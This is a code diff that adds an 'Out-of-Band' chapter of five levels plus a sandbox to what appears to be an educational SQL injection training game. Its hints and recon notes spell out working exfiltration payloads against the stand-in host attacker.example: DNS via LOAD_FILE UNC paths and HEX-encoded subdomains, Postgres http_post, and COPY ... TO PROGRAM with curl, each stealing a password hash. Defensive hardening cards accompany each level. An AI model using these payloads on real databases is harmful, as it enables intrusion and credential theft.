@@ -1918,7 +1918,193 @@ GRANT SELECT ON posts, products TO app_reader;
       };
     },
   },
-  // Chapter 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
+  8: {
+    id: 8, name: 'Out-of-Band', class: 'oob',
+    intro: 'When the front door is silent, the network still talks. DNS lookups, file reads, HTTP — anything you control becomes a channel.',
+    levels: {
+      1: {
+        id: '8.1', name: 'The Whisper Channel',
+        endpoint: 'POST /upload (input: filename)',
+        query: "SELECT LOAD_FILE('{u}')",
+        field: 'filename',
+        goal: 'Confirm OOB by triggering a DNS lookup against an attacker domain via UNC path.',
+        reconNotes: [
+          'MySQL on Windows: LOAD_FILE accepts UNC paths like \\\\\\\\host\\\\share.',
+          'A DNS lookup for the host occurs — your "Burp Collaborator" sees it.',
+          'No data needs to come back to the page; the network telemetry is the channel.',
+        ],
+        hints: [
+          'Point LOAD_FILE at a UNC path you control.',
+          "Payload:  \\\\\\\\attacker.example\\\\probe",
+        ],
+        check(p) {
+          const ok = /\\\\[\w.-]+\.[\w.-]+/.test(p) || /load_file\s*\(\s*['"]\\\\/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'attacker.example DNS lookup observed at 192.0.2.1. Channel open.' }
+            : { ok: false, narrate: 'No UNC path detected.' };
+        },
+        unlockTokens: ['LOAD_FILE(', '\\\\attacker.example\\probe'],
+        defense: {
+          title: 'Disable Filesystem + Network Functions',
+          body: 'Revoke LOAD_FILE, xp_dirtree, COPY ... PROGRAM, dblink, http extension. Restrict outbound network from DB hosts.',
+          code:
+`-- MySQL: revoke FILE privilege from app users.
+REVOKE FILE ON *.* FROM 'app'@'%';
+-- Network egress: DB hosts should not be able to make outbound DNS/HTTP.`,
+          tip: 'Defense-in-depth: parameterize, revoke OOB-capable funcs, block outbound network.',
+        },
+      },
+      2: {
+        id: '8.2', name: 'DNS Smuggling',
+        endpoint: 'POST /upload',
+        query: "SELECT LOAD_FILE('{u}')",
+        field: 'filename',
+        goal: 'Encode the database name into a subdomain so DNS exfils it.',
+        reconNotes: [
+          'Subdomain CONCAT: \\\\\\\\<encoded>.attacker.example\\\\x',
+          'CONCAT(0x5c5c, (SELECT database()), 0x2e, "attacker.example")',
+        ],
+        hints: [
+          'Build a UNC path whose hostname is the data + your domain.',
+          "Payload:  CONCAT('\\\\\\\\',(SELECT database()),'.attacker.example\\\\x')",
+        ],
+        check(p) {
+          const concat = /concat\s*\(/i.test(p);
+          const subq   = /select\s+database\s*\(\s*\)/i.test(p);
+          const dom    = /attacker\.example/.test(p) || /\.\w+\.\w+/.test(p);
+          return (concat && subq && dom)
+            ? { ok: true, narrate: 'DNS log: dungeon_db.attacker.example. Database name exfilled in one query.' }
+            : { ok: false, narrate: 'Concat or subquery missing.' };
+        },
+        unlockTokens: ['CONCAT(0x5c5c'],
+        defense: {
+          title: 'DNS Egress Controls',
+          body: 'Restrict DB host DNS to known internal resolvers + an allowlist. Suspicious lookups never escape.',
+          code:
+`# Network policy:
+db-host outbound DNS → internal-resolver (allowlist: rds.amazonaws.com, ...)
+                    → DROP everything else`,
+          tip: 'Most prod DB hosts have no business resolving arbitrary external domains.',
+        },
+      },
+      3: {
+        id: '8.3', name: 'The HTTP Beacon',
+        endpoint: 'POST /report (Postgres backend)',
+        query: 'SELECT generate_report({u})',
+        field: 'report_id',
+        goal: 'Use the Postgres http extension to POST a row to attacker.example.',
+        reconNotes: [
+          'http extension is enabled on this DB.',
+          "SELECT http_post('https://attacker.example/c', (SELECT pw_hash FROM users WHERE username='captain'))",
+        ],
+        hints: [
+          "Payload: 1; SELECT http_post('https://attacker.example/c', (SELECT pw_hash FROM users WHERE username='captain'))",
+        ],
+        check(p) {
+          const ok = /http_post\s*\(\s*['"]https?:\/\//i.test(p) && /select\s+pw_hash/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'POST landed at attacker.example/c with the hash in the body. Heist clean.' }
+            : { ok: false, narrate: 'http_post call missing the target.' };
+        },
+        unlockTokens: ['http_post('],
+        defense: {
+          title: 'Do Not Install Network Extensions',
+          body: 'pg_http, dblink, plpython3u — install only when needed. Default to none.',
+          code:
+`-- Audit installed extensions:
+SELECT extname FROM pg_extension;
+-- Drop unused: DROP EXTENSION http;`,
+          tip: 'Every extension is attack surface. Periodic audits catch drift.',
+        },
+      },
+      4: {
+        id: '8.4', name: 'The File Drop',
+        endpoint: 'POST /report (Postgres)',
+        query: 'SELECT generate_report({u})',
+        field: 'report_id',
+        goal: 'Use COPY ... PROGRAM to invoke a shell that curls data home.',
+        reconNotes: [
+          'COPY (subquery) TO PROGRAM \'curl https://attacker.example -d @-\' streams query output to a shell.',
+          'Available only to superusers — but legacy apps often run as one.',
+        ],
+        hints: [
+          "Payload:  1; COPY (SELECT pw_hash FROM users WHERE username='captain') TO PROGRAM 'curl https://attacker.example -d @-'",
+        ],
+        check(p) {
+          const ok = /copy\s*\(.*select.*\)\s*to\s+program/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Shell ran. Hash arrived at attacker.example.' }
+            : { ok: false, narrate: 'COPY ... TO PROGRAM not detected.' };
+        },
+        unlockTokens: ['COPY', 'TO PROGRAM'],
+        defense: {
+          title: 'Never Run the App as DB Superuser',
+          body: 'COPY ... PROGRAM, plperlu, plpython3u all require superuser. App role should be plain LOGIN with table privileges.',
+          code:
+`CREATE ROLE app LOGIN PASSWORD '...' NOSUPERUSER NOCREATEDB NOCREATEROLE;
+GRANT SELECT, INSERT, UPDATE ON specific_tables TO app;`,
+          tip: 'Superuser convenience is breach severity multiplier. Never.',
+        },
+      },
+      5: {
+        id: '8.5', name: 'The Quiet Exfil',
+        endpoint: 'POST /upload (MySQL Windows)',
+        query: "SELECT LOAD_FILE('{u}')",
+        field: 'filename',
+        goal: "Exfil captain's pw_hash via DNS subdomain encoding — no in-band channel needed.",
+        reconNotes: [
+          'No errors echoed, no length oracle, no time oracle. Only DNS goes out.',
+          'Encode (SELECT pw_hash...) as a hex subdomain, then LOAD_FILE the UNC path.',
+          "Skeleton:  CONCAT('\\\\\\\\',HEX((SELECT pw_hash FROM users WHERE username='captain')),'.attacker.example\\\\x')",
+        ],
+        hints: [
+          'HEX() the subquery so its bytes become a valid DNS label.',
+          "Payload:  CONCAT('\\\\\\\\',HEX((SELECT pw_hash FROM users WHERE username='captain')),'.attacker.example\\\\x')",
+        ],
+        check(p) {
+          const target = /select\s+pw_hash\s+from\s+users\s+where\s+username\s*=\s*['"]captain['"]/i.test(p);
+          const enc    = /(hex|to_base64|unhex|encode)\s*\(/i.test(p);
+          const dom    = /attacker\.example|\.\w+\.\w+/.test(p);
+          return (target && enc && dom)
+            ? { ok: true, narrate: 'Resolver log: 24a7…b8.attacker.example. Hash exfilled, no in-band trace.' }
+            : { ok: false, narrate: 'Missing target subquery, encoding, or external domain.' };
+        },
+        unlockTokens: ['HEX('],
+        defense: {
+          title: 'Tighten Network + Privileges + Inputs',
+          body: 'OOB needs three things to work: an injection, a network call, and outbound reach. Break any one.',
+          code:
+`-- Revoke FILE / network privileges from app user.
+-- Outbound DNS allowlist on DB hosts.
+-- Parameterize all queries.`,
+          tip: 'OOB is the last channel left when in-band is locked down. Lock the network too.',
+        },
+      },
+    },
+    sandbox(seed) {
+      const rand = mulberry32(seed);
+      const channels = ['DNS subdomain', 'http_post', 'COPY TO PROGRAM'];
+      const channel = channels[Math.floor(rand() * channels.length)];
+      return {
+        id: `8.S-${seed}`, name: `Sandbox: ${channel}`,
+        endpoint: 'POST /x', query: "SELECT f({u})", field: 'x',
+        goal: `Exfil any value of your choice via ${channel}.`,
+        reconNotes: [`Channel: ${channel}.`, 'Sandbox: cheatsheet definitions are visible.'],
+        hints: [],
+        check(p) {
+          const dns  = /(load_file\s*\(\s*['"]\\\\|concat\s*\(.+select.+\.\w+\.\w+)/i.test(p);
+          const http = /http_post\s*\(\s*['"]https?:\/\//i.test(p);
+          const copy = /copy\s*\(.*select.*\)\s*to\s+program/i.test(p);
+          const ok = (channel === 'DNS subdomain' && dns) || (channel === 'http_post' && http) || (channel === 'COPY TO PROGRAM' && copy);
+          return ok ? { ok: true, narrate: 'Beacon received.' } : { ok: false, narrate: 'Wrong channel shape.' };
+        },
+        unlockTokens: [],
+        defense: { title: 'Sandbox Cleared', body: 'Same defenses.', code: '// See cards.', tip: 'Re-roll.' },
+        sandbox: true,
+      };
+    },
+  },
+  // NoSQL bonus chapter still to author — see DESIGN.md §11.
 };
 
 const KNOWN_TOKENS = [
